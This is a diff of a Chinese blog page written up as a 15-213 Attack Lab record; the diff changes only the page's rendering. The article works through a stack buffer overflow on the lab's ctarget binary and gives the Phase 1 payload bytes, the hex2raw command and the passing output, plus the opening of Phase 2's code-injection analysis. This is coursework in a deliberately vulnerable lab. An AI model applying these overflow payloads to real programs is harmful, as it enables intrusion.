@@ -1,5 +1,4 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/blog/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/apple-touch-icon.png"/><meta name="msvalidate.01" content="C974411E5F5A79173F7830327E92F59E"/><meta name="google-site-verification" content="UJapM2d84iH6w1FVXFWeXhz_PoqtMDTU3mmNjGfRe1E"/><link rel="alternate" href="/blog/rss.xml" title="望春风" type="application/rss+xml"><link rel="alternate" href="/blog/atom.xml" title="望春风" type="application/atom+xml"><link rel="alternate" type="application/json" title="望春风" href="https://salvely.github.io/blog/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/blog/css/app.css?v=0.3.6"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/><link rel="canonical" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"><title>15213 Lab 3-Attack lab 实验记录</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">15213 Lab 3-Attack lab 实验记录</h1><div class="meta"><span class="item" title="创建时间：2024-02-29 10:36:22"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-02-29T10:36:22+08:00">2024-02-29</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>36k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>33 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/blog/" rel="start">Salvely</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YQSYM.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YS6XY.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/Y0iNK.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/Y0kTl.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YSIlc.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YSj7p.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/blog/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" itemprop="item" rel="index" title="分类于计算机科学"><span itemprop="name">计算机科学<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" itemprop="item" rel="index" title="分类于系统"><span itemprop="name">系统<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" itemprop="item" rel="index" title="分类于系统入门"><span itemprop="name">系统入门<meta itemprop="position" content="2"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" itemprop="item" rel="index" title="分类于15-213"><span itemprop="name">15-213<meta itemprop="position" content="3"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Lab/" itemprop="item" rel="index" title="分类于15-213 Lab"><span itemprop="name">15-213 Lab<meta itemprop="position" content="4"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/blog/assets/avatar.jpg"/><meta itemprop="name" content="Salvely"/><meta itemprop="description" content="自己买花自己戴，爱恨多自在。只为人生不重来，何不放开怀, 计算机&amp;数理&amp;文学爱好者，喜欢健身、下厨、听音乐和看电影"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="望春风"/></span><div class="body md" itemprop="articleBody"><h2 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作">#</a> 准备工作</h2>
-<p>文件夹中的几个重要文件如下：</p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/blog/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/apple-touch-icon.png"/><meta name="msvalidate.01" content="C974411E5F5A79173F7830327E92F59E"/><meta name="google-site-verification" content="UJapM2d84iH6w1FVXFWeXhz_PoqtMDTU3mmNjGfRe1E"/><link rel="alternate" href="/blog/rss.xml" title="望春风" type="application/rss+xml"><link rel="alternate" href="/blog/atom.xml" title="望春风" type="application/atom+xml"><link rel="alternate" type="application/json" title="望春风" href="https://salvely.github.io/blog/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/blog/css/app.css?v=0.3.6"><script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.js"></script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"/><link rel="canonical" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"><title>15213 Lab 3-Attack lab 实验记录</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">15213 Lab 3-Attack lab 实验记录</h1><div class="meta"><span class="item" title="创建时间：2024-02-29 10:36:22"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-02-29T10:36:22+08:00">2024-02-29</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>36k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>33 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/blog/" rel="start">Salvely</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YS6XY.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/Y0iNK.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YS2LU.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/Y0kTl.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/Y0xvg.jpg"></li><li class="item" data-background-image="https://i.imgtg.com/2023/03/09/YSj7p.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/blog/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/" itemprop="item" rel="index" title="分类于计算机科学"><span itemprop="name">计算机科学<meta itemprop="position" content="0"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/" itemprop="item" rel="index" title="分类于系统"><span itemprop="name">系统<meta itemprop="position" content="1"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/" itemprop="item" rel="index" title="分类于系统入门"><span itemprop="name">系统入门<meta itemprop="position" content="2"/></span></a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/" itemprop="item" rel="index" title="分类于15-213"><span itemprop="name">15-213<meta itemprop="position" content="3"/></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/blog/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213-Lab/" itemprop="item" rel="index" title="分类于15-213 Lab"><span itemprop="name">15-213 Lab<meta itemprop="position" content="4"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/blog/assets/avatar.jpg"/><meta itemprop="name" content="Salvely"/><meta itemprop="description" content="自己买花自己戴，爱恨多自在。只为人生不重来，何不放开怀, 计算机&amp;数理&amp;文学爱好者，喜欢健身、下厨、听音乐和看电影"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="望春风"/></span><div class="body md" itemprop="articleBody"><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>文件夹中的几个重要文件如下：</p>
 <ul>
 <li>cookie.txt: 8 个 16 进制数字的码，用于唯一标记</li>
 <li>ctarget: 准备用于 code injection attack</li>
@@ -9,9 +8,7 @@
 <li>rtarget: 准备用于 return oriented programming attacks</li>
 </ul>
 <p>实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。</p>
-<h2 id="part-i-code-injection-attack"><a class="markdownIt-Anchor" href="#part-i-code-injection-attack">#</a> Part I: Code Injection Attack</h2>
-<h3 id="phase-1覆盖返回地址"><a class="markdownIt-Anchor" href="#phase-1覆盖返回地址">#</a> Phase 1：覆盖返回地址</h3>
-<p>在这个 phase 中，我们需要引导 ctarget 中的 <code>test</code>  函数返回到 <code>touch1</code>  函数。首先我们对 <code>ctarget</code>  做反汇编。其中 <code>test</code>  函数的汇编代码如下：</p>
+<h2 id="Part-I-Code-Injection-Attack"><a href="#Part-I-Code-Injection-Attack" class="headerlink" title="Part I: Code Injection Attack"></a>Part I: Code Injection Attack</h2><h3 id="Phase-1：覆盖返回地址"><a href="#Phase-1：覆盖返回地址" class="headerlink" title="Phase 1：覆盖返回地址"></a>Phase 1：覆盖返回地址</h3><p>在这个 phase 中，我们需要引导 ctarget 中的<code>test</code>函数返回到<code>touch1</code>函数。首先我们对<code>ctarget</code>做反汇编。其中<code>test</code>函数的汇编代码如下：</p>
 <pre><code>0000000000401968 &lt;test&gt;:
   401968:	48 83 ec 08          	sub    $0x8,%rsp
   40196c:	b8 00 00 00 00       	mov    $0x0,%eax
@@ -24,8 +21,8 @@
   40198c:	48 83 c4 08          	add    $0x8,%rsp
   401990:	c3                   	retq
 </code></pre>
-<p>而 <code>touch1</code>  函数的地址是 <code>0x4017c0</code> 。</p>
-<p>在这其中我们调用 <code>getbuf</code>  函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是 <code>0x401976</code> ，我们需要将其换成 <code>0x4017c0</code> 。我们现在对 <code>getbuf</code>  进行反汇编 (nop 指令省去)：</p>
+<p>而<code>touch1</code>函数的地址是<code>0x4017c0</code>。</p>
+<p>在这其中我们调用<code>getbuf</code>函数来进行 buffer overflow 攻击，原本的该函数的下一条返回地址是<code>0x401976</code>，我们需要将其换成<code>0x4017c0</code>。我们现在对<code>getbuf</code>进行反汇编(nop 指令省去)：</p>
 <pre><code>00000000004017a8 &lt;getbuf&gt;:
   4017a8:	48 83 ec 28          	sub    $0x28,%rsp
   4017ac:	48 89 e7             	mov    %rsp,%rdi
@@ -37,25 +34,46 @@
 <p>对该过程进行分析：</p>
 <ol>
 <li>留出 40 个字节的位置</li>
-<li>rdi = rsp</li>
+<li>rdi &#x3D; rsp</li>
 <li>调用 gets 函数</li>
-<li>eax = 1</li>
+<li>eax &#x3D; 1</li>
 <li>恢复栈空间</li>
 <li>返回</li>
 </ol>
 <p>要完成这个实验，我们需要直到几个值：</p>
 <ol>
-<li>buf 的位置：应该进入 <code>getbuf</code>  后， <code>%rsp - 40</code>  之后的位置</li>
-<li>返回地址在栈中位置：在调用 <code>callq</code>  函数时，我们会将 <code>%rsp - 8</code> ，然后将返回地址压入，然后将 <code>%rip</code>  设置为 <code>getbuf</code>  函数的地址。（同理，调用 <code>retq</code>  的时候，我们会把栈顶的地址赋给 <code>%rip</code> ，然后让 <code>%rsp + 8</code> ，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完 <code>callq</code>  之后 <code>%rsp</code>  的位置。</li>
-<li><code>touch1</code>  函数的地址: <code>0x4017c0</code></li>
+<li>buf 的位置: 应该进入<code>getbuf</code>后，<code>%rsp - 40</code>之后的位置</li>
+<li>返回地址在栈中位置: 在调用<code>callq</code>函数时，我们会将<code>%rsp - 8</code>，然后将返回地址压入，然后将<code>%rip</code>设置为<code>getbuf</code>函数的地址。（同理，调用<code>retq</code>的时候，我们会把栈顶的地址赋给<code>%rip</code>，然后让<code>%rsp + 8</code>，也就是弹出返回地址）因此返回地址在栈中的位置也就是调用完<code>callq</code>之后<code>%rsp</code>的位置。</li>
+<li><code>touch1</code>函数的地址:<code>0x4017c0</code></li>
 </ol>
-<p>这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a, 那个是换行符）。因为是小端法，最后 8 个字节应该是 <code>0xc0 0x17 0x40</code> 。</p>
-<p>该阶段输入内容存储在 <code>phase1.txt</code>  中，内容如下： <code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40</code> 。输入命令 <code>./hex2raw &lt; phase1.txt | ./ctarget -q</code>  进行测试 ( <code>-q</code>  是指运行在本地电脑上)，结果如下：</p>
-<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Cookie: 0x59b997fa</pre></td></tr><tr><td data-num="2"></td><td><pre>Type string:Touch1<span class="token operator">!</span>: You called touch1<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Valid solution <span class="token keyword">for</span> level <span class="token number">1</span> with target ctarget</pre></td></tr><tr><td data-num="4"></td><td><pre>PASS: Would have posted the following:</pre></td></tr><tr><td data-num="5"></td><td><pre>        user <span class="token function">id</span> bovik</pre></td></tr><tr><td data-num="6"></td><td><pre>        course  <span class="token number">15213</span>-f15</pre></td></tr><tr><td data-num="7"></td><td><pre>        lab     attacklab</pre></td></tr><tr><td data-num="8"></td><td><pre>        result  <span class="token number">1</span>:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 <span class="token number">17</span> <span class="token number">40</span></pre></td></tr></table></figure><p>成功！</p>
-<h3 id="phase-2在-buf-中插入攻击代码并覆盖返回地址"><a class="markdownIt-Anchor" href="#phase-2在-buf-中插入攻击代码并覆盖返回地址">#</a> Phase 2：在 buf 中插入攻击代码并覆盖返回地址</h3>
-<p>在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让 <code>test</code>  函数返回到 <code>touch2</code> ，而且我们需要让 <code>val</code>  的值等于 <code>cookie</code>  的值。（而且这里我们不能直接让 <code>test</code>  返回到打印 <code>Touch2!</code>  那一句，因为前面有 <code>vlevel = 2</code> ，后面需要验证这个值是不是 2，如果直接跳到那一句的话， <code>vlevel</code>  没有赋值，也肯定不等于 2，验证就会失败）。</p>
-<p><code>touch2</code>  的函数源码如下：</p>
-<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><code>touch2</code>  的汇编函数如下：</p>
+<p>这样来看，buf 及其本地变量部分应该是分配了 40 个字节，而返回地址有 8 个字节，因此我们在写入的时候，前 40 个字节随意（不能有 0x0a,那个是换行符）。因为是小端法，最后 8 个字节应该是<code>0xc0 0x17 0x40</code>。</p>
+<p>该阶段输入内容存储在<code>phase1.txt</code>中，内容如下：<code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40</code>。输入命令<code>./hex2raw &lt; phase1.txt | ./ctarget -q</code>进行测试(<code>-q</code>是指运行在本地电脑上)，结果如下：</p>
+<pre><code class="bash">Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
+</code></pre>
+<p>成功！</p>
+<h3 id="Phase-2：在-buf-中插入攻击代码并覆盖返回地址"><a href="#Phase-2：在-buf-中插入攻击代码并覆盖返回地址" class="headerlink" title="Phase 2：在 buf 中插入攻击代码并覆盖返回地址"></a>Phase 2：在 buf 中插入攻击代码并覆盖返回地址</h3><p>在这个 phase 中我们需要在 buffer overflow 字符串中保留一部分攻击代码，让<code>test</code>函数返回到<code>touch2</code>，而且我们需要让<code>val</code>的值等于<code>cookie</code>的值。（而且这里我们不能直接让<code>test</code>返回到打印<code>Touch2!</code>那一句，因为前面有<code>vlevel = 2</code>，后面需要验证这个值是不是 2，如果直接跳到那一句的话，<code>vlevel</code>没有赋值，也肯定不等于 2，验证就会失败）。</p>
+<p><code>touch2</code>的函数源码如下：</p>
+<pre><code class="c">void touch2(unsigned val)
+&#123;
+    vlevel = 2; /* Part of validation protocol */
+    if (val == cookie) &#123;
+        printf(&quot;Touch2!: You called touch2(0x%.8x)\n&quot;, val);
+        validate(2);
+    &#125; else &#123;
+        printf(&quot;Misfire: You called touch2(0x%.8x)\n&quot;, val);
+        fail(2);
+    &#125;
+    exit(0);
+&#125;
+</code></pre>
+<p><code>touch2</code>的汇编函数如下：</p>
 <pre><code>00000000004017ec &lt;touch2&gt;:
 seg1:
   4017ec:	48 83 ec 08          	sub    $0x8,%rsp
@@ -82,22 +100,21 @@ seg3:
   401842:	bf 00 00 00 00       	mov    $0x0,%edi
   401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;
 </code></pre>
-<p>从上述汇编代码可以看出， <code>val</code>  的值在最开始存在 <code>edi</code>  处。那么我们的目的就是让这个值等于 <code>cookie</code> 。而且 <code>cookie</code>  的位置是 <code>6044e4</code> 。所以我们的目的是让 <code>%edi</code>  寄存器的值等于 <code>6044e4</code>  处的值。</p>
+<p>从上述汇编代码可以看出，<code>val</code>的值在最开始存在<code>edi</code>处。那么我们的目的就是让这个值等于<code>cookie</code>。而且<code>cookie</code>的位置是<code>6044e4</code>。所以我们的目的是让<code>%edi</code>寄存器的值等于<code>6044e4</code>处的值。</p>
 <p>要实现攻击，我们的 buffer overflow 必须完成四步动作：</p>
 <ol>
 <li>让 return address 等于 buf 的开头</li>
-<li>在 buf 开头插入赋值语句，让 <code>%edi = *0x6044e4</code></li>
-<li>让 return address = touch2 的入口地址 ( <code>0x4017ec</code> )</li>
-<li>调用 <code>ret</code></li>
+<li>在 buf 开头插入赋值语句，让<code>%edi = *0x6044e4</code></li>
+<li>让 return address &#x3D; touch2 的入口地址(<code>0x4017ec</code>)</li>
+<li>调用<code>ret</code></li>
 </ol>
-<p>首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后 <code>%rsp</code>  在哪里。<br>
-我们着重观察 3 个地方的 <code>$rsp</code> ：</p>
+<p>首先，要完成第一步，我们首先得找到 buf 的开头位置。通过 phase 1 的 getbuf 我们可以知道，buf 的位置在压完返回地址后减去 40 个字节的位置。因为前三问的栈的位置固定，因此我们可以通过 gdb 看一下减去 40 以后<code>%rsp</code>在哪里。<br>我们着重观察 3 个地方的<code>$rsp</code>：</p>
 <ol>
-<li>调用 <code>getbuf</code>  之前: 0x5561dca8</li>
-<li>调用 <code>getbuf</code>  之后: 0x5561dca0</li>
-<li>调用 <code>rsp = rsp - 40</code>  之后: 0x5561dc78</li>
+<li>调用<code>getbuf</code>之前: 0x5561dca8</li>
+<li>调用<code>getbuf</code>之后: 0x5561dca0</li>
+<li>调用<code>rsp = rsp - 40</code>之后: 0x5561dc78</li>
 </ol>
